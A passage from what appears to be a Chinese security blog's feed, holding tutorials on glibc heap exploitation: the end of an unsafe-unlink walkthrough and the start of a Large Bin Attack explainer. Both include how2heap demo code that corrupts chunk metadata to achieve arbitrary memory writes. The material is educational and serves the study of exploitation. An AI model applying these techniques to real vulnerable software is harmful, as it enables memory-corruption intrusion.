class="built_in">printf</span>(<span class="string">&quot;The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> malloc_size = <span class="number">0x80</span>; <span class="comment">//we want to be big enough not to use fastbins</span></span><br><span class="line"><span class="type">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">chunk0_ptr = (<span class="type">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line"><span class="type">uint64_t</span> *chunk1_ptr  = (<span class="type">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The global chunk0_ptr is at %p, pointing to %p\n&quot;</span>, &amp;chunk0_ptr, chunk0_ptr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The victim chunk we are going to corrupt is at %p\n\n&quot;</span>, chunk1_ptr);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We create a fake chunk inside chunk0.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We setup the &#x27;next_free_chunk&#x27; (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\n&quot;</span>);</span><br><span class="line">chunk0_ptr[<span class="number">2</span>] = (<span class="type">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="type">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We setup the &#x27;previous_free_chunk&#x27; (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n&quot;</span>);</span><br><span class="line">chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="type">uint64_t</span>)*<span class="number">2</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Fake chunk fd: %p\n&quot;</span>,(<span class="type">void</span>*) chunk0_ptr[<span class="number">2</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Fake chunk bk: %p\n\n&quot;</span>,(<span class="type">void</span>*) chunk0_ptr[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n&quot;</span>);</span><br><span class="line"><span class="type">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We shrink the size of chunk0 (saved as &#x27;previous_size&#x27; in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;It&#x27;s important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n&quot;</span>);</span><br><span class="line">chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;If we had &#x27;normally&#x27; freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n&quot;</span>,(<span class="type">void</span>*)chunk1_hdr[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We mark our fake chunk as free by setting &#x27;previous_in_use&#x27; of chunk1 as False.\n\n&quot;</span>);</span><br><span class="line">chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n&quot;</span>);</span><br><span class="line"><span class="type">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(victim_string,<span class="string">&quot;Hello!~&quot;</span>);</span><br><span class="line">chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>) victim_string;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Original value: %s\n&quot;</span>,victim_string);</span><br><span class="line">chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242L</span>L;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;New Value: %s\n&quot;</span>,victim_string);</span><br><span class="line"></span><br><span class="line"><span class="comment">// sanity check</span></span><br><span class="line">assert(*(<span class="type">long</span> *)victim_string == <span class="number">0x4141414142424242L</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>part1：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> malloc_size = <span class="number">0x80</span>; <span class="comment">//we want to be big enough not to use fastbins</span></span><br><span class="line"><span class="type">int</span> header_size = <span class="number">2</span>;</span><br><span class="line">chunk0_ptr = (<span class="type">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line"><span class="type">uint64_t</span> *chunk1_ptr  = (<span class="type">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br></pre></td></tr></table></figure><p><img src="/../PWN/Unlink/9.png" alt="image-20250428184127013"></p><p>如图所示，创造了两个chunk ， 分别是 chunk0 和 chunk1 。</p><p>part2：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">chunk0_ptr[<span class="number">2</span>] = (<span class="type">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="type">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line">chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="type">uint64_t</span>)*<span class="number">2</span>);</span><br></pre></td></tr></table></figure><p><img src="/../PWN/Unlink/10.png" alt="image-20250428184519864"></p><p>伪造 fake_chunk 的 fd 、bk 指针（图中红色部分仅展示部分fake_chunk），这里面 0x602078 存储了 fake_chunk 的首地址，所以我们可以把 fd 修改为 0x602078 - 0x18 , bk 修改为 0x602078 - 0x10 ，这样形成了 空闲chunk链 可以绕过检查。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line">chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line">chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br></pre></td></tr></table></figure><p><img src="/../PWN/Unlink/11.png" alt="image-20250428185148304"></p><p>这部分是修改 fake_chunk 的下一个chunk（chunk1） ，目的是表示 fake_chunk 为空闲堆块 ，free 后触发向后合并unlink ，代码修改了 chunk1 的 prev_size 为 fake_chunk 的实际大小（0x80），同时修改了 prev_inuse 位为0 （如果忘记为什么要这样改的话，可以回顾一下上文检查一的内容）。</p><p>part3：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">free</span>(chunk1_ptr);</span><br></pre></td></tr></table></figure><p><img src="/../PWN/Unlink/12.png" alt="image-20250428185544329"></p><p>free（）后触发 unlink ，把 fake_chunk 取出，并且向后合并 ，图中可以看到 fake_chunk 的 size 发生了变化，证明成功合并，这里的size 其实是 fake_chunk + chunk1 + topchunk 的总大小，由于没有堆块隔离 topchunk ，导致与 topchunk 也发生了合并，不过没关系，这里不影响我们进行下一步操作。</p><p>part4：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line">chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>) victim_string;</span><br><span class="line">chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242L</span>L;</span><br></pre></td></tr></table></figure><p>终于到了最关键的一步 ——– 实现任意地址写 ，我们可以通过修改 fake_chunk 的指针 ， 指向任意地址 ，就可以向里面输入一些自己想要的东西啦！</p><p><img src="/../PWN/Unlink/13.png" alt="image-20250428195817806"></p><p>源码创造了一个目标变量 ，地址为 0x7fffffffdc10 ，我们的目标就是修改该地址的内容</p><p><img src="/../PWN/Unlink/14.png" alt="image-20250428200036495"></p><p>这是我们 chunk0_ptr 指针，由于 unlink 操作 ，chunk0_ptr 由原先的 0x603010 变成了 0x602060 ，这就代表了堆块首地址变成了 0x602060 , 我们定位到该地址去：</p><p><img src="/../PWN/Unlink/15.png" alt="image-20250428200416684"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>) victim_string;</span><br></pre></td></tr></table></figure><p>此时 0x602060 对应的是我们的 chunk0_ptr[0] , 0x602078 对应的是我们的 chunk0_ptr[3]（fake_chunk首地址） ，只要我们修改chunk0_ptr[3] 为我们的目标地址 victim_string ，这样我们的 fake_chunk 首地址就会指向 victim_string ，我们就可以对这个地址的值进行改写 。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242L</span>L;</span><br></pre></td></tr></table></figure><p>再改写 chunk0_ptr[0] 就可以将地址  0x7fffffffdc10 的值改写为  0x4141414142424242LL 了。</p><p><img src="/../PWN/Unlink/16.png" alt="image-20250428200912466"></p><p>改写成功！实现 unlink漏洞的利用</p>]]></content>
      
      
      <categories>
          
          <category> 知识归纳 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Unlink </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Large Bin Attack 攻击手法介绍</title>
      <link href="/2025/04/24/Large-Bin-Attack/"/>
      <url>/2025/04/24/Large-Bin-Attack/</url>
      
        <content type="html"><![CDATA[<h1 id="Large-Bin"><a href="#Large-Bin" class="headerlink" title="Large Bin"></a>Large Bin</h1><ul><li><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念 :"></a>基本概念 :</h2></li></ul><p>Large Bin 是 glibc 堆内存管理中的一种数据结构，用于存储较大尺寸的空闲内存块，一般管理大于1024字节的空闲chunk（32-bit 系统 512 字节，64-bit 系统 1024 字节）。</p><ul><li><h2 id="Large-Bin-的结构"><a href="#Large-Bin-的结构" class="headerlink" title="Large Bin 的结构 :"></a>Large Bin 的结构 :</h2></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>Large Bin 在结构上与其他 Bins 有所不同，在拥有 prev_size 、 size 以及 fd 、 bk 的情况下，<strong>还多了fd_nextsize 和 bk_nextsize 两种指针结构</strong></p><ul><li>fd_nextsize 表示指向前一个与当前chunk大小不同的第一个空闲块，不包含Bin的头指针。</li><li>bk_nextsize 表示指向后一个与当前chunk大小不同的第一个空闲块，不包含Bin的头指针。</li></ul><p>**组成部分:**Large Bins 中含有 63 个Bins ，而 Large Bins 总体又被分成 6 个组 ， 每个组对应一个区间，且容纳个数呈指数性减少。</p><p><img src="/../PWN/LargeBinAttack/1.png" alt="image-20250425150822345"></p><ul><li><h2 id="链表结构："><a href="#链表结构：" class="headerlink" title="链表结构："></a>链表结构：</h2><img src="/../PWN/LargeBinAttack/2.png" alt="image-20250425154611746"></li></ul><h3 id="补充-："><a href="#补充-：" class="headerlink" title="补充 ："></a>补充 ：</h3><p>只有首堆块的fd_nextsize、bk_nextsize会指向其他大小的内存块，其相同大小的非首堆块的fd_nextsize、bk_nextsize无效 ，通常为0。</p><ul><li><h2 id="插入顺序："><a href="#插入顺序：" class="headerlink" title="插入顺序："></a>插入顺序：</h2></li></ul><p><strong>LIBC-2.23源码：</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> (in_smallbin_range(size)) </span><br><span class="line">&#123;</span><br><span class="line">  victim_index = smallbin_index(size);</span><br><span class="line">  bck = bin_at(av, victim_index);</span><br><span class="line">  fwd = bck-&gt;fd;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  victim_index = largebin_index(size);</span><br><span class="line">  bck = bin_at(av, victim_index); </span><br><span class="line">  fwd = bck-&gt;fd; </span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fwd != bck) &#123;</span><br><span class="line"></span><br><span class="line">      size |= PREV_INUSE;</span><br><span class="line">      assert((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (bck-&gt;bk-&gt;size)) &#123;</span><br><span class="line"></span><br><span class="line">          fwd = bck;</span><br><span class="line">          bck = bck-&gt;bk; </span><br><span class="line"></span><br><span class="line">          victim-&gt;fd_nextsize = fwd-&gt;fd; </span><br><span class="line"></span><br><span class="line">          victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize; </span><br><span class="line"></span><br><span class="line">          fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line"></span><br><span class="line">      &#125; </span><br><span class="line">      <span class="keyword">else</span> </span><br><span class="line">      &#123;</span><br><span class="line">          assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; fwd-&gt;size) &#123;</span><br><span class="line">              fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">              assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size == (<span class="type">unsigned</span> <span class="type">long</span>) fwd-&gt;size)</span><br><span class="line">              fwd = fwd-&gt;fd; </span><br><span class="line">          <span class="keyword">else</span> </span><br><span class="line">          &#123;</span><br><span class="line">              victim-&gt;fd_nextsize = fwd;</span><br><span class="line">              victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">              fwd-&gt;bk_nextsize = victim;</span><br><span class="line">              victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">          &#125;</span><br><span class="line">          bck = fwd-&gt;bk;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125; </span><br><span class="line">  <span class="keyword">else</span> </span><br><span class="line">    victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">mark_bin(av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure><ol><li>在 Large Bin 中 ，堆块的排列顺序是从大到小，越大的堆块越靠近头部，越小的堆块越靠近尾部。</li><li>大小相同的堆块 ， 按照 free 的先后顺序排序 ，最先释放的堆块作为首堆块，其次释放的堆块延续往后。</li></ol><h1 id="Large-Bin-Attack"><a href="#Large-Bin-Attack" class="headerlink" title="Large Bin Attack"></a>Large Bin Attack</h1><p>Large Bin Attack 的攻击方式在低版本glibc-2.23和高版本glibc-2.31有所不同，所以我们需要划分为两个板块，分别来描述其攻击手法。</p><h2 id="GLIBC-2-23-攻击手法"><a href="#GLIBC-2-23-攻击手法" class="headerlink" title="GLIBC-2.23 攻击手法"></a>GLIBC-2.23 攻击手法</h2><p>为了便于理解，本文将使用<a href="https://github.com/shellphish/how2heap">how2heap</a>关于Large Bin Attack漏洞利用的源码进行调试分析。</p><h4 id="how2heap源码展示："><a href="#how2heap源码展示：" class="headerlink" title="how2heap源码展示："></a>how2heap源码展示：</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file demonstrates large bin attack by writing a large unsigned long value into stack\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;In practice, large bin attack is generally prepared for further attacks, such as rewriting the &quot;</span></span><br><span class="line">           <span class="string">&quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var1 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s first look at the targets we want to rewrite on stack:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %ld\n&quot;</span>, &amp;stack_var1, stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %ld\n\n&quot;</span>, &amp;stack_var2, stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we allocate the first large chunk on the heap at: %p\n&quot;</span>, p1 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot; the first large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Then, we allocate the second large chunk on the heap at: %p\n&quot;</span>, p2 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot; the second large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Finally, we allocate the third large chunk on the heap at: %p\n&quot;</span>, p3 - <span class="number">2</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot; the third large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We free the first and second large chunks now and they will be inserted in the unsorted bin:&quot;</span></span><br><span class="line">           <span class="string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>, (<span class="type">void</span> *)(p2 - <span class="number">2</span>), (<span class="type">void</span> *)(p2[<span class="number">0</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the&quot;</span></span><br><span class="line">            <span class="string">&quot; freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation&quot;</span></span><br><span class="line">            <span class="string">&quot;, and reinsert the remaining of the freed first large chunk into the unsorted bin:&quot;</span></span><br><span class="line">            <span class="string">&quot; [ %p ]\n\n&quot;</span>, (<span class="type">void</span> *)((<span class="type">char</span> *)p1 + <span class="number">0x90</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p3);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we free the third large chunk and it will be inserted in the unsorted bin:&quot;</span></span><br><span class="line">           <span class="string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>, (<span class="type">void</span> *)(p3 - <span class="number">2</span>), (<span class="type">void</span> *)(p3[<span class="number">0</span>]));</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the freed second large chunk&#x27;s \&quot;size\&quot;&quot;</span></span><br><span class="line">            <span class="string">&quot; as well as its \&quot;bk\&quot; and \&quot;bk_nextsize\&quot; pointers\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk&quot;</span></span><br><span class="line">            <span class="string">&quot; at the head of the large bin freelist. To overwrite the stack variables, we set \&quot;bk\&quot; to 16 bytes before stack_var1 and&quot;</span></span><br><span class="line">            <span class="string">&quot; \&quot;bk_nextsize\&quot; to 32 bytes before stack_var2\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    p2[<span class="number">-1</span>] = <span class="number">0x3f1</span>;</span><br><span class="line">    p2[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var1 - <span class="number">2</span>);</span><br><span class="line">    p2[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var2 - <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s malloc again, so the freed third large chunk being inserted into the large bin freelist.&quot;</span></span><br><span class="line">            <span class="string">&quot; During this time, targets should have already been rewritten:\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="type">void</span> *)stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="type">void</span> *)stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sanity check</span></span><br><span class="line">    assert(stack_var1 != <span class="number">0</span>);</span><br><span class="line">    assert(stack_var2 != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Large-Bin-Attack-的利用思路以及其作用："><a href="#Large-Bin-Attack-的利用思路以及其作用：" class="headerlink" title="Large Bin Attack 的利用思路以及其作用："></a>Large Bin Attack 的利用思路以及其作用：</h3><p>再进行下一步的调试之前，我们需要先知道 Large Bin Attack 的利用思路和作用，才能帮助我们更好的理解 Large Bin Attack 手法：</p><ul><li>利用思路：通过纂改已释放的大堆块的 bk_nextsize 指针 ， 在 largebin 的插入过程中，利用大堆块的排序机制 ，实现 Large Bin Attack。</li><li>作用：可以实现任意地址写入堆块地址。</li></ul><h3 id="Large-Bin-Attack-源码调试："><a href="#Large-Bin-Attack-源码调试：" class="headerlink" title="Large Bin Attack 源码调试："></a>Large Bin Attack 源码调试：</h3><p>（为了更加便于理解，我会把调试过程拆解成几个大板块，同时分支细化成数个小板块）</p><p><u>第一步：目标地址以及大堆块的创建</u></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> stack_var1 = <span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> stack_var2 = <span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br></pre></td></tr></table></figure><p><img src="/../PWN/LargeBinAttack/3.png" alt="image-20250426195629165"></p><p>创建了两个变量 stack_var1 和 stack_var2 ，以及三个大堆块 p1、p2 和 p3，大小分别是0x430、0x510、0x510 ，其中每个大堆块以及 Top chunk 中间都隔了一个0x30小堆块，这个小堆块的作用是防止大堆块之间相互合并。</p><p><strong>我们的目标就是将 stack_var1 和 stack_var2 的值改写成堆块的地址，可以看到现在两个变量的值都是零 。</strong></p><p><u>第二步：释放 p1 和 p2 ，使其进入 unsorted bin。</u></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">free</span>(p1);</span><br><span class="line"><span class="built_in">free</span>(p2);</span><br></pre></td></tr></table></figure><p><img src="/../PWN/LargeBinAttack/4.png" alt="image-20250426195752913"></p><p><u>第三步：申请一个合适大小的堆块，触发 unsorted bin 遍历 。</u></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br></pre></td></tr></table></figure><hr><h4 id="unsorted-bin-相关机制："><a href="#unsorted-bin-相关机制：" class="headerlink" title="unsorted bin 相关机制："></a>unsorted bin 相关机制：</h4><p>我们要使 unsorted bin 进入 large bin ， 就要先知道unsorted bin的相关机制，通常我们释放一个堆块，glibc会尝试与前后堆块发生合并，合并后若非topchunk，且大小超过 unsorted bin 的设定阈值 , 它不会立即进入small bin &#x2F; large bin 中 ，而是进入 unsorted bin 中缓存起来，同时unsorted bin采用**<u>先进先出</u>**的插入取出方式。</p><p>在调用下一次 malloc(req_size) 时，首先会检查 fastbin 